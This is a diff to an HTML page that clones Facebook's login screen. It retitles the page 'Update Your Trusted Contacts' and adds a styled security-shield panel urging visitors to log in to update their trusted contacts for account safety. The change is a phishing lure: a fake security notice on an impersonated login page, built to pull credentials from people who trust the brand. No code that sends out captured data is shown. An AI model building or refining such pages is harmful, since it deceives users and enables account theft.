@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
-  <title>Facebook – log in or sign up</title>
+  <title>Facebook - Update Your Trusted Contacts</title>
   <link rel="icon" href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iIzE4NzdGMiI+PHBhdGggZD0iTTI0IDEyLjA3M2MwLTYuNjI3LTUuMzczLTEyLTEyLTEycy0xMiA1LjM3My0xMiAxMmMwIDUuOTkgNC4zODggMTAuOTU0IDEwLjEyNSAxMS45Mjd2LTguNDM3SDcuMDc4di0zLjQ5aDMuMDQ3VjkuNDNjMC0zLjAwNyAxLjc5Mi00LjY2OSA0LjUzMy00LjY2OSAxLjMxMiAwIDIuNjg2LjIzNCAyLjY4Ni4yMzR2Mi45NTNoLTEuNTE0Yy0xLjQ5MSAwLTEuOTU1LjkyNS0xLjk1NSAxLjg3NHYyLjI1aDMuMzI4bC0uNTMyIDMuNDloLTIuNzk2djguNDM3QzE5LjYxMiAyMy4wMjcgMjQgMTguMDYyIDI0IDEyLjA3M3oiLz48L3N2Zz4=">
   <style>
     /* Reset styles */
@@ -235,6 +235,41 @@
       cursor: not-allowed;
     }
     
+    /* Trusted Contacts Shield Responsive */
+    .trusted-contacts-shield {
+      margin-top: 32px;
+      padding: 20px;
+      background: linear-gradient(135deg, #e3f2fd 0%, #f0f8ff 100%);
+      border-radius: 12px;
+      border-left: 4px solid #1877f2;
+      box-shadow: 0 2px 8px rgba(24, 119, 242, 0.1);
+    }
+    
+    .shield-header {
+      display: flex;
+      align-items: center;
+      margin-bottom: 12px;
+    }
+    
+    .shield-icon {
+      margin-right: 12px;
+      flex-shrink: 0;
+    }
+    
+    .shield-title {
+      color: #1877f2;
+      font-size: 16px;
+      font-weight: 600;
+      margin: 0;
+    }
+    
+    .shield-description {
+      color: #1c1e21;
+      font-size: 14px;
+      line-height: 1.4;
+      margin: 0;
+    }
+    
     /* Responsive design */
     @media (max-width: 898px) {
       .fb-content {
@@ -256,6 +291,20 @@
       .fb-logo {
         font-size: 56px;
       }
+      
+      .trusted-contacts-shield {
+        margin-top: 24px;
+        padding: 16px;
+        text-align: left;
+      }
+      
+      .shield-title {
+        font-size: 15px;
+      }
+      
+      .shield-description {
+        font-size: 13px;
+      }
     }
     
     @media (max-width: 580px) {
@@ -274,6 +323,28 @@
       .fb-tagline {
         font-size: 20px;
         line-height: 24px;
+      }
+      
+      .trusted-contacts-shield {
+        margin-top: 20px;
+        padding: 14px;
+      }
+      
+      .shield-header {
+        margin-bottom: 8px;
+      }
+      
+      .shield-icon {
+        margin-right: 8px;
+      }
+      
+      .shield-title {
+        font-size: 14px;
+      }
+      
+      .shield-description {
+        font-size: 12px;
+        line-height: 1.3;
       }
     }
     
@@ -417,7 +488,22 @@
     <div class="fb-content">
       <div class="fb-left">
         <h1 class="fb-logo">facebook</h1>
-        <p class="fb-tagline">Facebook helps you connect and share with the people in your life.</p>
+        <p class="fb-tagline">Connect with friends and the world around you on Facebook.</p>
+        
+        <!-- Trusted Contacts Security Shield -->
+        <div class="trusted-contacts-shield">
+          <div class="shield-header">
+            <!-- Security Shield Icon -->
+            <svg class="shield-icon" width="28" height="28" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <path d="M12 1L3 5V11C3 16.55 6.84 21.74 12 23C17.16 21.74 21 16.55 21 11V5L12 1Z" stroke="#1877f2" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" fill="#e3f2fd"/>
+              <path d="M9 12L11 14L16 9" stroke="#1877f2" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+            <h3 class="shield-title">Trusted Contacts Security Update</h3>
+          </div>
+          <p class="shield-description">
+            To enhance your account security, please log in to update your trusted contacts. This helps protect your account and ensures you can recover access if needed.
+          </p>
+        </div>
       </div>
       
       <div class="fb-right">
